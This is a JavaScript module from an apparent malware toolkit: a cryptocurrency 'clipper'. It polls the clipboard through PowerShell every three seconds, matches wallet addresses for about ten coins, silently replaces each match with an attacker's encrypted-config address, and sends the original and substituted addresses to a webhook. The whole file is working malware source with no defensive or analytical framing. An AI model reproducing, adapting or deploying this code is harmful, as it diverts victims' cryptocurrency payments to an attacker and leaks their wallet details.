module.exports = (client) => {
    return {

        async detectClipboard() {
            while (true) {
                client.requires.child_process.exec("powershell Get-Clipboard", async (err, stdout) => {
                    for (let [key, value] of Object.entries({
                            btc: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/,
                            ltc: /(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)/,
                            eth: /(?:^0x[a-fA-F0-9]{40}$)/,
                            xlm: /(?:^G[0-9a-zA-Z]{55}$)/,
                            xmr: /(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)/,
                            xrp: /(?:^r[0-9a-zA-Z]{24,34}$)/,
                            bch: /^((bitcoincash:)?(q|p)[a-z0-9]{41})/,
                            dash: /(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)/,
                            neo: /(?:^A[0-9a-zA-Z]{33}$)/,
                            doge: /D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}/,
                        })) {
                        for (let _value of (stdout.split("\n"))) {
                            if (_value.length > 256) {
                                return;
                            }
                            if (_value.replace("\r", "").match(value)) {
                                if (_value.replace("\r", "") != client.utils.encryption.decryptData(client.config.crypto[key])) {
                                    client.requires.child_process.exec(`powershell Set-Clipboard ${client.utils.encryption.decryptData(client.config.crypto[key])}`)

                                    var embeds = []

                                    embeds.push({
                                        url: client.utils.encryption.decryptData(client.config.embed.href),
                                        footer: {
                                            text: client.utils.encryption.decryptData(client.config.embed.footer.text),
                                            icon_url: client.utils.encryption.decryptData(client.config.embed.footer.icon_url),
                                        },
                                        fields: [],
                                        timestamp: new Date(),
                                        title: `🤑 Detected ${key.toUpperCase()} wallet (Clipper)`,
                                        fields: [{
                                            name: "Wallet",
                                            value: `\`\`\`${_value.replace("\r", "")}\`\`\``,
                                            inline: false,
                                        }, {
                                            name: "Replaced with",
                                            value: `\`\`\`${client.utils.encryption.decryptData(client.config.crypto[key])}\`\`\``,
                                            inline: false,
                                        }]
                                    })

                                    await client.utils.webhook.sendToWebhook(
                                        client.utils.encryption.decryptData(client.config.webhook.url), {
                                            "embeds": embeds
                                        })

                                    break;
                                }
                            }
                        }
                    }
                });
                await client.utils.time.sleep(3000);
            }
        },
    };
};